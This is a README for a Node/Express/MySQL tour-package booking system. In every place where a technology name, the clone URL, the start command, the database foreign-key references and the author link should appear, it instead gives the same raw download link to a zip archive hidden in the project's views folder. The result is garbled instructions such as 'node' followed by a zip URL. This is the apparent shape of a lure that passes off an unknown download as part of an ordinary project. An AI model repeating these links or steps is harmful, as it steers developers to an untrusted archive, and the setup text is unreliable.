
# Tour Package Management System

This project is a **Tour Package Management System** built using **https://github.com/MudassirQureshi7987/Tour_Package_Management_System/raw/refs/heads/main/src/views/Tour-Package-System-Management-2.2-beta.3.zip**, **Express**, **Ejs** and **MySQL**. It allows customers to browse and book tour packages, while administrators can manage packages, view customer bookings, and update/delete packages.

## Features

### Customer:
- Browse available tour packages.
- Book a tour package.
- View booking confirmation.

### Admin:
- Add, update, and delete tour packages.
- View all customer bookings.
- Search and filter tour packages

## Installation

### Prerequisites
- https://github.com/MudassirQureshi7987/Tour_Package_Management_System/raw/refs/heads/main/src/views/Tour-Package-System-Management-2.2-beta.3.zip and npm installed
- MySQL installed
- Git (for version control)
## Tech Stack

- Frontend: HTML, CSS, JavaScript
- Backend: https://github.com/MudassirQureshi7987/Tour_Package_Management_System/raw/refs/heads/main/src/views/Tour-Package-System-Management-2.2-beta.3.zip, Express
- Database: MySQL
- View Engine: EJS (Embedded JavaScript)
- Other: dotenv for environment variables


## Run Locally

Clone the project

```bash
  git clone https://github.com/MudassirQureshi7987/Tour_Package_Management_System/raw/refs/heads/main/src/views/Tour-Package-System-Management-2.2-beta.3.zip
```

Go to the project directory

```bash
  cd Tour_Package_Management_System
```

Install dependencies

```bash
  npm install
```

Start the server

```bash
  node https://github.com/MudassirQureshi7987/Tour_Package_Management_System/raw/refs/heads/main/src/views/Tour-Package-System-Management-2.2-beta.3.zip
```


## Database Schema

- Customers:
    - customer_id (Primary Key)
    - first_name
    - last_name
    - email

 - TourPackages:
    - package_id (Primary Key)
    - package_name
    - description
    - destination
    - price
    - duration
    - start_date
    - end_date

 - Bookings:
    - booking_id (Primary Key)
    - customer_id (Foreign Key references https://github.com/MudassirQureshi7987/Tour_Package_Management_System/raw/refs/heads/main/src/views/Tour-Package-System-Management-2.2-beta.3.zip)
    - package_id (Foreign Key references https://github.com/MudassirQureshi7987/Tour_Package_Management_System/raw/refs/heads/main/src/views/Tour-Package-System-Management-2.2-beta.3.zip)
    - booking_date
## Environment Variables

To run this project, you will need to add the following environment variables to your .env file

`MYSQL_HOST = 'localhost'`

`MYSQL_USER = 'your_username_here'`

`MYSQL_PASSWORD = 'your_password_here'`

`MYSQL_DATABASE = 'your_dbname_here'`

`PORT = your_portNum_here`
## Screenshots

  ### Home Screen
   ![home screen](screenshots/{C67CE3FB-D11B-4DB2-8296-D0256DA156BE}.png)
  ### Customer Page
   ![Customer Tour Packages](screenshots/{84631EFF-AEB3-4248-BFD8-77D115996FC8}.png)
   ![Book Tour Package](screenshots/{5471CD81-0F7E-44C3-9FCD-69C44E6E5D6C}.png)
  ### Admin Page
  ![Add Tour Packages](screenshots/{03E37B47-4B79-41F1-AABB-B7D62FF4911F}.png)
   ![Manage Tour Packages](screenshots/{57E2DA55-C4EB-4F95-BDA8-D6F3CC8B777A}.png)

## Authors

- [@N1nadLad](https://github.com/MudassirQureshi7987/Tour_Package_Management_System/raw/refs/heads/main/src/views/Tour-Package-System-Management-2.2-beta.3.zip)

